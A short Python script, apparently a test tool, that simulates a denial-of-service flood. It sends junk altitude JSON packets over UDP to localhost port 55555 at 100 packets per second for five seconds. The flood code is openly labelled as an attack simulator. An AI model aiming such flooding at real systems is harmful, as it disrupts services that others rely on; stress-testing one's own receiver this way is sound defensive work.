import socket
import json
import time
import random

HOST = 'localhost'
PORT = 55555

ATTACK_RATE_PER_SEC = 100 
SEND_INTERVAL = 1 / ATTACK_RATE_PER_SEC 
ATTACK_DURATION = 5 

def create_junk_word() -> bytes:
    """Creates a random, irrelevant data packet."""
    junk_altitude = random.randint(99999, 999999)
    data = {
        "altitude": junk_altitude,
        "type": "junk_dos"
    }
    return json.dumps(data).encode('utf-8')

def dos_simulator():
    """Simulates a Denial of Service data flood."""
    print("💣 DoS Attack Simulator Starting...")
    print(f"    Flooding target at {HOST}:{PORT} for {ATTACK_DURATION} seconds...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    start_time = time.time()
    packets_sent = 0

    try:
        while time.time() - start_time < ATTACK_DURATION:
            word = create_junk_word()
            sock.sendto(word, (HOST, PORT))
            packets_sent += 1

            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        pass
    finally:
        print(f"\nDoS Simulation Finished. Sent {packets_sent} packets.")
        sock.close()

if __name__ == "__main__":
    dos_simulator()
